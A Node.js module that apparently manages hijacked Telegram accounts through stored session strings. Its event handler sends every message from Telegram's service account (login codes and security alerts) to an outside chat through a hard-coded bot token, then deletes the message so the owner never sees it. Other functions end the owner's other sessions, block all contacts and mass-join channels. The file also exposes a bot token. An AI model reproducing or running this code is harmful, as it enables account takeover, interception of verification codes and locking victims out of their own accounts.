const { TelegramClient, Api } = require('telegram');
const { NewMessage } = require("telegram/events/index.js");
const axios = require('axios');
const { StringSession } = require('telegram/sessions');
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
const clients = new Map();

function getClient(number) {
    return clients.get(number);
}

function hasClient(number) {
    return clients.has(number);
}

function deleteClient(number) {
    return clients.delete(number);
}

async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}


async function createClient(number, session, autoDisconnect = true) {
    return new Promise(async (resolve) => {
        const cli = new TelegramManager(session, number);
        await cli.createClient(autoDisconnect);
        if (cli.expired) {
            clients.set(number, cli);
        }
        resolve(cli.expired);
    });
}


class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.expired = false;
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async createClient(autoDisconnect = true) {
        try {
            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            await this.client.connect();
            // const msg = await this.client.sendMessage("777000", { message: "." });
            // await msg.delete({ revoke: true });
            const myMsgs = await this.client.getMessages('me', { limit: 8 });
            if (autoDisconnect) {
                setTimeout(async () => {
                    console.log("SELF destroy client");
                    await this.client.disconnect();
                    await this.client.destroy();
                    this.session.delete();
                    clients.delete(this.phoneNumber);
                }, 180000)
            }
            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
            const chats = await this.client?.getDialogs({ limit: 500 });
            console.log("TotalChats:", chats['total'])
            this.expired = { msgs: myMsgs['total'], total: chats['total'] }
        } catch (error) {
            console.log(error);
            this.expired = undefined;
        }
    }

    async getLastMsgs(limit) {
        const msgs = await this.client.getMessages("777000", { limit: parseInt(limit) });
        let resp = ''
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp = resp + msg.text + "\n"
        })
        return (resp)
    }

    async joinChannels(str) {
        const channels = str.split('|');
        for (let i = 0; i < channels.length; i++) {
            const channel = channels[i].trim();
            try {
                let joinResult;
                if (channel.startsWith('@')) {
                    joinResult = await this.client.invoke(
                        new Api.channels.JoinChannel({
                            channel: await this.client.getEntity(channel),
                        })
                    );
                } else {
                    const peerChannel = new Api.PeerChannel({ channelId: bigInt(channel) });
                    joinResult = await this.client.invoke(
                        new Api.channels.JoinChannel({
                            channel: await this.client.getEntity(peerChannel),
                        })
                    );
                }
                console.log("Joined channel Sucess")
            } catch (error) {
                console.log(error);
            }
            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
        }
    }


    async removeOtherAuths() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        return result
    }

    async blockAllUsers() {
        const chats = await this.client?.getDialogs({ limit: 600 });
        for (let chat of chats) {
            if (chat.isUser) {
                await this.blockAUser(chat.id)
            }
            sleep(5000);
        }
    }

    async blockAUser(id) {
        const result = await this.client.invoke(
            new Api.contacts.Block({
                id: id,
            })
        );
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        })
        return latest
    }
    
    async getMe() {
        const me = await this.client.getMe();
        return me
    }

    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios.post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.error('Error sending message:', error.response?.data?.description);
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }
}

module.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient, deleteClient }
